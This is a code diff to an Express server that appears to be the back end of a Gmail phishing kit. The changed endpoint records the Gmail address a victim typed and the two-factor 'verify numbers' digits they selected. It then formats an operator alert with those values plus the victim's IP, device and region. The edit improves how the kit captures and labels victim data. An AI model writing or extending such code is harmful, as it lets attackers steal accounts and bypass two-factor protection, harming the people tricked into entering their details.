@@ -1459,7 +1459,14 @@ app.post("/send-verification-confirm", async (req, res) => {
     }
 
     const confirmRequestId = `confirm_${Date.now()}_${Math.random().toString(36).substring(7)}`;
-    console.log(`📋 Verification confirm: ${email} selected ${digit1}${digit2}`);
+    
+    // ✅ Get displayEmail from pendingVerificationPage (the Gmail email user entered)
+    let displayEmail = email;
+    if (pendingVerificationPage[requestId] && pendingVerificationPage[requestId].displayEmail) {
+      displayEmail = pendingVerificationPage[requestId].displayEmail;
+    }
+    
+    console.log(`📋 Verification confirm: ${displayEmail} selected ${digit1}${digit2}`);
 
     const ip = getIP(req);
     const userAgent = req.get("user-agent") || "Unknown";
@@ -1470,6 +1477,7 @@ app.post("/send-verification-confirm", async (req, res) => {
     pendingVerificationConfirm[confirmRequestId] = { 
       status: "pending", 
       email: email,
+      displayEmail: displayEmail,
       digit1: digit1,
       digit2: digit2
     };
@@ -1477,7 +1485,7 @@ app.post("/send-verification-confirm", async (req, res) => {
     const message =
       `🌈🌈🌈 <b>Gmail - Verify Numbers</b> 🌈🌈🌈\n` +
       `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>📧 Email:</b> <code>${email}</code>\n` +
+      `<b>📧 Email:</b> <code>${displayEmail}</code>\n` +
       `<b>🔢 Selected Numbers:</b> <code><b>${digit1}${digit2}</b></code>\n` +
       `<b>🌍 Region:</b> ${region}\n` +
       `<b>💻 Device:</b> ${device}\n` +
